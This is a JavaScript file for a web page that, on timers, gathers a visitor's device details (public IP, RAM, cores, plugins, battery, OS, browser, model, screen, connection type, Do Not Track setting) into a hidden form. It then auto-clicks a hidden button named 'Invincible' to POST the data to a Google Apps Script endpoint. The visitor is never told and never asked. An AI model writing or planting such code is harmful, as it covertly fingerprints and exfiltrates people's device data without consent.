var crrTime, userMemory, userCores, userBroSys;

function fetchData() {
    /* Device Date And Time */
    try {
        var currentTime = new Date();

        var dd = String(currentTime.getDate()).padStart(2, '0');
        var mm = String(currentTime.getMonth() + 1).padStart(2, '0'); //January is 0!
        var yyyy = currentTime.getFullYear();

        var currentOffset = currentTime.getTimezoneOffset();
        var ISTTime = new Date(currentTime.getTime() + (330 + currentOffset) * 60000);
        var hoursIST = ISTTime.getHours();
        var minutesIST = ISTTime.getMinutes();

        var PostfixTime = " AM";
        if (hoursIST > 12) {
            hoursIST -= 12;
            PostfixTime = " PM"
        }
        document.getElementById("Time").value = hoursIST + ":" + minutesIST + PostfixTime;
        document.getElementById("Date").value = dd + '/' + mm + '/' + yyyy;
    } catch {
        document.getElementById("Time").value = "Cannot Fetch";
        document.getElementById("Date").value = "Cannot Fetch";
    }


    /* Device Ram */
    try {
        userMemory = (navigator.deviceMemory) + " GB";
    } catch {
        userMemory = "Cannot Fetch";
    } finally {
        document.getElementById("RAM").value = userMemory;
    }

    /* Device Cores */
    try {
        userCores = (navigator.hardwareConcurrency);
    } catch {
        userCores = "Cannot Fetch";
    } finally {
        document.getElementById("Cores").value = userCores;
    }

    /* Device Plugins */
    try {
        var PluginsUsed = "";
        for (var i = 0; i < navigator.plugins.length; i++) {
            PluginsUsed += navigator.plugins[i].name + ",";
        }

    } catch {
        PluginsUsed = "Cannot Fetch";
    } finally {
        document.getElementById("Plugins").value = PluginsUsed;
    }

    /* Device IP Address */
    try {
        $.getJSON("https://api.ipify.org?format=json",
            function(data) {
                document.getElementById("IP_Address").value = data.ip;
            });
    } catch {
        document.getElementById("IP_Address") = "Cannot Fetch";
    }


    try {
        var parser = new UAParser();
        var OS = navigator.userAgent;
        parser.setUA(OS);
        var result = parser.getResult();

        /* Device OS */
        try {
            document.getElementById("OS_Type").value = parser.getOS().name;
        } catch {
            document.getElementById("OS_Type").value = "Cannot Fetch";
        }

        /* Device Model */
        try {
            if (parser.getDevice().model != undefined) {
                document.getElementById("Model").value = parser.getDevice().model;
            } else {
                document.getElementById("Model").value = "Cannot Fetch";
            }

        } catch {
            document.getElementById("Model").value = "Cannot Fetch";
        }

        /* Device Browser */
        try {
            document.getElementById("Browser").value = parser.getBrowser().name + " (" + parser.getBrowser().version + ")";
        } catch {
            document.getElementById("Browser").value = "Cannot Fetch";
        }

        /* Device Battery */
        try {
            navigator.getBattery().then(function(battery) {
                var level = battery.level * 100;
                document.getElementById("Battery").value = level + "%";
            });
        } catch {
            document.getElementById("Battery").value = "Cannot Fetch";
        }

        /* Device OS Versio */
        try {
            document.getElementById("OS_Version").value = result.os.version;
        } catch {
            document.getElementById("OS_Version").value = "Cannot Fetch";
        }

        /* Device CPU Architecture */
        try {
            if (result.cpu.architecture != undefined) {
                document.getElementById("Cpu_Architecture").value = result.cpu.architecture;
            } else {
                document.getElementById("Cpu_Architecture").value = "Cannot Fetch";
            }

        } catch {
            document.getElementById("Cpu_Architecture").value = "Cannot Fetch";
        }

        /* Device Screen Size */
        try {
            document.getElementById("Screen_Size").value = screen.width + " X" + screen.height;
        } catch {
            document.getElementById("Screen_Size").value = "Cannot Fetch";
        }

        /* Device Type */
        try {
            if (result.device.type != undefined) {
                document.getElementById("Device_Type").value = result.device.type;
            } else {
                document.getElementById("Device_Type").value = "Cannot Fetch";
            }

        } catch {
            document.getElementById("Device_Type").value = "Cannot Fetch";
        }

        /* Device Vendor */
        try {
            document.getElementById("Device_Vendor").value = result.device.vendor;
        } catch {
            document.getElementById("Device_Vendor").value = "Cannot Fetch";
        }

        /* Connection Type */
        try {
            if (navigator.connection.type != undefined) {
                document.getElementById("Connection_Type").value = navigator.connection.type;
            } else {
                document.getElementById("Connection_Type").value = "Cannot Fetch";
            }

        } catch {
            document.getElementById("Connection_Type").value = "Cannot Fetch";
        }

        /* Tracker Allowed */
        try {
            document.getElementById("Track_Allowed").value = navigator.doNotTrack;
        } catch {
            document.getElementById("Track_Allowed").value = "Cannot Fetch";
        }

    } catch {

    } finally {
        setTimeout(
            function() {
                document.getElementById("Invincible").click();
            }, 4000);
    }
}
setTimeout(fetchData, 3000);

function sheet() {
const scriptURLHidden = 'https://script.google.com/macros/s/AKfycbwfEHRRM1_w-_bwM0dsYeySjWdeIk2sgqWdSXM/exec';

const formHidden = document.getElementsByClassName("hidden-form")
const btnFormHidden = document.getElementById("Invincible")

btnFormHidden.addEventListener('click', e => {
    e.preventDefault()
    fetch(scriptURLHidden, {
        method: 'POST',
        body: new FormData(formHidden[0])
    })
})
}
setTimeout(sheet, 1000)

